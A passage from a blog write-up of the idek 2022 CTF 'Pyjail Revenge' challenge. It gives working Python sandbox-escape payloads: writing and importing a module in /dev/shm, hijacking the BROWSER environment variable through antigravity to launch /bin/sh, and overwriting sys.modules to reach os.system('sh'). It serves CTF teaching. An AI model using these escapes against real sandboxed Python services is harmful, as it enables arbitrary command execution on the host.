<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="built_in">setattr</span>(<span class="built_in">__import__</span>(<span class="string">&quot;sys&quot;</span>), <span class="string">&quot;path&quot;</span>, <span class="built_in">list</span>((<span class="string">&quot;/dev/shm/&quot;</span>,))), <span class="built_in">print</span>(<span class="string">&quot;import os&quot;</span> + <span class="built_in">chr</span>(<span class="number">10</span>) + <span class="string">&quot;print(os&quot;</span> + <span class="built_in">chr</span>(<span class="number">46</span>) + <span class="string">&quot;system(&#x27;/readflag giveflag&#x27;))&quot;</span>, file=<span class="built_in">open</span>(<span class="string">&quot;/dev/shm/exp&quot;</span> + <span class="built_in">chr</span>(<span class="number">46</span>) + <span class="string">&quot;py&quot;</span>, <span class="string">&quot;w&quot;</span>)), <span class="built_in">__import__</span>(<span class="string">&quot;exp&quot;</span>))</span><br><span class="line">idek&#123;what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!&#125;</span><br><span class="line"><span class="number">0</span></span><br><span class="line">(<span class="literal">None</span>, <span class="literal">None</span>, &lt;module <span class="string">&#x27;lol&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/dev/shm/exp.py&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure>

<p>Of course, it should be caused by environmental problems. The /tmp of the remote environment is read-only, but it should be writable. If the above path is writable in tmp, the relevant payload can also be completed.</p>
<h3 id="Method-3-antigravity-hijacks-the-BROWSER-environment-variable"><a href="#Method-3-antigravity-hijacks-the-BROWSER-environment-variable" class="headerlink" title="Method 3 antigravity hijacks the BROWSER environment variable:"></a>Method 3 antigravity hijacks the BROWSER environment variable:</h3><p>And antigravity can be seen from here <a target="_blank" rel="noopener" href="https://towardsdatascience.com/7-easter-eggs-in-python-7765dc15a203">https://towardsdatascience.com/7-easter-eggs-in-python-7765dc15a203</a></p>
<p>This solution comes from the author’s expected solution. This question is very interesting. Use setattr to overwrite the environment variable BROWSER in os.environ so that it can be executed. Track it<br><a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/main/Lib/antigravity.py">https://github.com/python/cpython/blob/main/Lib/antigravity.py</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> webbrowser</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">webbrowser.<span class="built_in">open</span>(<span class="string">&quot;https://xkcd.com/353/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geohash</span>(<span class="params">latitude, longitude, datedow</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Compute geohash() using the Munroe algorithm.</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; geohash(37.421542, -122.085589, b&#x27;2005-05-26-10458.68&#x27;)</span></span><br><span class="line"><span class="string">    37.857713 -122.544543</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># https://xkcd.com/426/</span></span><br><span class="line">    h = hashlib.md5(datedow, usedforsecurity=<span class="literal">False</span>).hexdigest()</span><br><span class="line">    p, q = [(<span class="string">&#x27;%f&#x27;</span> % <span class="built_in">float</span>.fromhex(<span class="string">&#x27;0.&#x27;</span> + x)) <span class="keyword">for</span> x <span class="keyword">in</span> (h[:<span class="number">16</span>], h[<span class="number">16</span>:<span class="number">32</span>])]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%d%s %d%s&#x27;</span> % (latitude, p[<span class="number">1</span>:], longitude, q[<span class="number">1</span>:]))</span><br></pre></td></tr></table></figure>

<p>Found that it called <code>webbrowser</code>, continue to track<br>You can see from here that there is <code>register_standard_browsers</code> in the open function<br><a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L84">https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L84</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">open</span>(<span class="params">url, new=<span class="number">0</span>, autoraise=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Display url using the default browser.</span></span><br><span class="line"><span class="string">    If possible, open url in a location determined by new.</span></span><br><span class="line"><span class="string">    - 0: the same browser window (the default).</span></span><br><span class="line"><span class="string">    - 1: a new browser window.</span></span><br><span class="line"><span class="string">    - 2: a new browser page (&quot;tab&quot;).</span></span><br><span class="line"><span class="string">    If possible, autoraise raises the window (the default) or not.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> _tryorder <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">with</span> _lock:</span><br><span class="line">            <span class="keyword">if</span> _tryorder <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                register_standard_browsers()</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> _tryorder:</span><br><span class="line">        browser = get(name)</span><br><span class="line">        <span class="keyword">if</span> browser.<span class="built_in">open</span>(url, new, autoraise):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>Continue to track <code>register_standard_browsers</code> to find that it checks the <code>BROWSER</code> environment variable in <code>os.environ</code><br><a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L585">https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L585</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;BROWSER&quot;</span> <span class="keyword">in</span> os.environ:</span><br><span class="line">    userchoices = os.environ[<span class="string">&quot;BROWSER&quot;</span>].split(os.pathsep)</span><br><span class="line">    userchoices.reverse()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Treat choices in same way as if passed into get() but do register</span></span><br><span class="line">    <span class="comment"># and prepend to _tryorder</span></span><br><span class="line">    <span class="keyword">for</span> cmdline <span class="keyword">in</span> userchoices:</span><br><span class="line">        <span class="keyword">if</span> cmdline != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            cmd = _synthesize(cmdline, preferred=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">if</span> cmd[<span class="number">1</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                register(cmdline, <span class="literal">None</span>, GenericBrowser(cmdline), preferred=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>Where <code>GenericBrowser</code> can run <code>cmdline</code><br><a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L181">https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L181</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GenericBrowser</span>(<span class="title class_ inherited__">BaseBrowser</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Class for all browsers started with a command</span></span><br><span class="line"><span class="string">       and without remote functionality.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(name, <span class="built_in">str</span>):</span><br><span class="line">            self.name = name</span><br><span class="line">            self.args = [<span class="string">&quot;%s&quot;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># name should be a list with arguments</span></span><br><span class="line">            self.name = name[<span class="number">0</span>]</span><br><span class="line">            self.args = name[<span class="number">1</span>:]</span><br><span class="line">        self.basename = os.path.basename(self.name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open</span>(<span class="params">self, url, new=<span class="number">0</span>, autoraise=<span class="literal">True</span></span>):</span><br><span class="line">        sys.audit(<span class="string">&quot;webbrowser.open&quot;</span>, url)</span><br><span class="line">        cmdline = [self.name] + [arg.replace(<span class="string">&quot;%s&quot;</span>, url)</span><br><span class="line">                                 <span class="keyword">for</span> arg <span class="keyword">in</span> self.args]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> sys.platform[:<span class="number">3</span>] == <span class="string">&#x27;win&#x27;</span>:</span><br><span class="line">                p = subprocess.Popen(cmdline)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p = subprocess.Popen(cmdline, close_fds=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">not</span> p.wait()</span><br><span class="line">        <span class="keyword">except</span> OSError:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>final exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;antigravity&#x27;</span>,<span class="built_in">setattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>),<span class="string">&#x27;environ&#x27;</span>,<span class="built_in">dict</span>(BROWSER=<span class="string">&#x27;/bin/sh -c &quot;/readflag giveflag&quot; #%s&#x27;</span>))) </span><br></pre></td></tr></table></figure>

<h4 id="Method-4-Let-import-load-getattr-to-take-effect-by-restoring-sys-modules"><a href="#Method-4-Let-import-load-getattr-to-take-effect-by-restoring-sys-modules" class="headerlink" title="Method 4 Let __import__ load getattr to take effect by restoring sys.modules:"></a>Method 4 Let <code>__import__</code> load getattr to take effect by restoring sys.modules:</h4><p>Since <code>__import__</code> will first look for <code>sys.modules</code> <a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/48ec678287a3be1539823fa3fc0ef457ece7e1c6/Lib/importlib/_bootstrap.py#L1101">https://github.com/python/cpython/blob/48ec678287a3be1539823fa3fc0ef457ece7e1c6/Lib/importlib/_bootstrap.py#L1101</a> when loading, you can first override <code>sys.modules</code> by <code>setattr</code> <code>__builtins__</code>, so that <code>__import__</code> can call <code>getattr</code>. Through <code>getattr</code>, <code>os.system</code> can be loaded. Since it is banned, you can use <code>__import__(&#39;os&#39;), &#39;system&#39;</code>, and then pass the parameter <code>&#39;sh&#39;</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>),<span class="string">&#x27;modules&#x27;</span>,__builtins__) <span class="keyword">or</span> <span class="built_in">__import__</span>(<span class="string">&#x27;getattr&#x27;</span>)(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>),<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="end"><a href="#end" class="headerlink" title="end"></a>end</h3><p>Thanks to lrh2000,UnblvR,maple3142 help for this article</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://crazymanarmy.github.io">crazyman_army</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/">https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Misc/">Misc</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Pyjail/">Pyjail</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/01/27/y7ElGdeCTWafXrh.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/23/Insomni%E2%80%99hack-teaser-2023-Autopsy/" title="Insomni’hack teaser 2023 - Autopsy"><img class="cover" src="https://s2.loli.net/2023/01/27/EihMjorFgk3KGJq.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Insomni’hack teaser 2023 - Autopsy</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/16/idek-CTF-2022-Forensics-HiddenGem-Mixtape-Writeup/" title="idek CTF 2022* Forensics - HiddenGem Mixtape Writeup"><img class="cover" src="https://s2.loli.net/2023/01/27/mMRbNxrHtVLlu7v.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">idek CTF 2022* Forensics - HiddenGem Mixtape Writeup</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/10/26/ASIS-CTF-2021-Misc-Writeup/" title="ASIS CTF 2021 Misc Writeup"><img class="cover" src="https://s2.loli.net/2023/01/27/GWw7O9Bdc3XQNFR.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-26</div><div class="title">ASIS CTF 2021 Misc Writeup</div></div></a></div><div><a href="/2021/12/08/HITCON-2021-Misc-Writeup/" title="HITCON 2021 Misc Writeup"><img class="cover" src="https://s2.loli.net/2023/01/27/bAmU9f3XC6PLZ4d.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-08</div><div class="title">HITCON 2021 Misc Writeup</div></div></a></div><div><a href="/2023/01/31/Hgame-2023-week3-Tunnel-&&-Tunnel-Revenge-Writeup(EN)/" title="Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(EN)"><img class="cover" src="https://s2.loli.net/2023/01/27/LEtGKn9vX3DBSil.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-31</div><div class="title">Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(EN)</div></div></a></div><div><a href="/2023/01/31/Hgame-2023-week3-Tunnel-&&-Tunnel-Revenge-Writeup-CN/" title="Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(CN)"><img class="cover" src="https://s2.loli.net/2023/01/27/LEtGKn9vX3DBSil.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-31</div><div class="title">Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(CN)</div></div></a></div><div><a href="/2023/01/23/Insomni%E2%80%99hack-teaser-2023-Autopsy/" title="Insomni’hack teaser 2023 - Autopsy"><img class="cover" src="https://s2.loli.net/2023/01/27/EihMjorFgk3KGJq.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-23</div><div class="title">Insomni’hack teaser 2023 - Autopsy</div></div></a></div><div><a href="/2021/08/30/Writeup-of-Flag-Thief-in-WMCTF-2021/" title="Writeup of Flag Thief in WMCTF 2021"><img class="cover" src="https://s2.loli.net/2023/01/27/rLiM3O7u6wknvDY.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-30</div><div class="title">Writeup of Flag Thief in WMCTF 2021</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/01/27/XA2Yr7TuwcNWhOp.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">crazyman_army</div><div class="author-info__description">A Noob's Learning Record</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">27</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/crazymanarmy"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://twitter.com/CrazymanArmy" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a><a class="social-icon" href="mailto:crazyman_army@foxmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://crazymanarmy.github.io/atom.xml" target="_blank" title="RSS"><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">欢迎来到我的blog,这里主要记录一些由我所自己研究的东西,包括打比赛的writeup,漏洞分析,样本分析,学习记录,感想和其他杂七杂八的东西.希望你可以在这里玩得开心 ^_^</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#idek-2022-CTF-Pyjail-amp-amp-Pyjail-Revenge-Writeup"><span class="toc-number">1.</span> <span class="toc-text">idek 2022* CTF Pyjail &amp;&amp; Pyjail Revenge Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pyjail"><span class="toc-number">1.1.</span> <span class="toc-text">Pyjail:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pyjail-Revenge"><span class="toc-number">1.2.</span> <span class="toc-text">Pyjail Revenge:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-1-remove-overlay"><span class="toc-number">1.2.1.</span> <span class="toc-text">Method 1 remove overlay:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-2-Modify-sys-path-write-the-file-and-then-import"><span class="toc-number">1.2.2.</span> <span class="toc-text">Method 2 Modify sys.path, write the file and then import:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-3-antigravity-hijacks-the-BROWSER-environment-variable"><span class="toc-number">1.2.3.</span> <span class="toc-text">Method 3 antigravity hijacks the BROWSER environment variable:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Method-4-Let-import-load-getattr-to-take-effect-by-restoring-sys-modules"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">Method 4 Let __import__ load getattr to take effect by restoring sys.modules:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#end"><span class="toc-number">1.2.4.</span> <span class="toc-text">end</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/02/03/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Misc-Isolated-Machine-Memory-Analysis-Writeup/" title="第六届西湖论剑网络安全大赛-Misc Isolated Machine Memory Analysis Writeup"><img src="https://s2.loli.net/2023/02/03/ILHDQObjZ5xtFPa.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第六届西湖论剑网络安全大赛-Misc Isolated Machine Memory Analysis Writeup"/></a><div class="content"><a class="title" href="/2023/02/03/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Misc-Isolated-Machine-Memory-Analysis-Writeup/" title="第六届西湖论剑网络安全大赛-Misc Isolated Machine Memory Analysis Writeup">第六届西湖论剑网络安全大赛-Misc Isolated Machine Memory Analysis Writeup</a><time datetime="2023-02-03T15:30:00.000Z" title="Created 2023-02-03 23:30:00">2023-02-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/03/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Misc-%E6%9C%BA%E4%BD%A0%E5%A4%AA%E7%BE%8E-Writeup/" title="第六届西湖论剑网络安全大赛-Misc 机你太美 Writeup"><img src="https://s2.loli.net/2023/02/03/ILHDQObjZ5xtFPa.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第六届西湖论剑网络安全大赛-Misc 机你太美 Writeup"/></a><div class="content"><a class="title" href="/2023/02/03/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Misc-%E6%9C%BA%E4%BD%A0%E5%A4%AA%E7%BE%8E-Writeup/" title="第六届西湖论剑网络安全大赛-Misc 机你太美 Writeup">第六届西湖论剑网络安全大赛-Misc 机你太美 Writeup</a><time datetime="2023-02-03T11:20:00.000Z" title="Created 2023-02-03 19:20:00">2023-02-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/31/Hgame-2023-week3-Tunnel-&amp;&amp;-Tunnel-Revenge-Writeup(EN)/" title="Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(EN)"><img src="https://s2.loli.net/2023/01/27/LEtGKn9vX3DBSil.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(EN)"/></a><div class="content"><a class="title" href="/2023/01/31/Hgame-2023-week3-Tunnel-&amp;&amp;-Tunnel-Revenge-Writeup(EN)/" title="Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(EN)">Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(EN)</a><time datetime="2023-01-31T12:00:00.000Z" title="Created 2023-01-31 20:00:00">2023-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/31/Hgame-2023-week3-Tunnel-&amp;&amp;-Tunnel-Revenge-Writeup-CN/" title="Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(CN)"><img src="https://s2.loli.net/2023/01/27/LEtGKn9vX3DBSil.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(CN)"/></a><div class="content"><a class="title" href="/2023/01/31/Hgame-2023-week3-Tunnel-&amp;&amp;-Tunnel-Revenge-Writeup-CN/" title="Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(CN)">Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(CN)</a><time datetime="2023-01-31T12:00:00.000Z" title="Created 2023-01-31 20:00:00">2023-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/30/RealWorld-CTF-5th-Paddle-Writeup/" title="RealWorld CTF 5th - Paddle Writeup"><img src="https://s2.loli.net/2023/01/30/OGIBvu3sSgNFRzQ.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RealWorld CTF 5th - Paddle Writeup"/></a><div class="content"><a class="title" href="/2023/01/30/RealWorld-CTF-5th-Paddle-Writeup/" title="RealWorld CTF 5th - Paddle Writeup">RealWorld CTF 5th - Paddle Writeup</a><time datetime="2023-01-30T12:00:00.000Z" title="Created 2023-01-30 20:00:00">2023-01-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://s2.loli.net/2023/01/27/y7ElGdeCTWafXrh.png')"><div id="footer-wrap"><div class="copyright">&copy;2023 By crazyman_army</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hope you like them</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>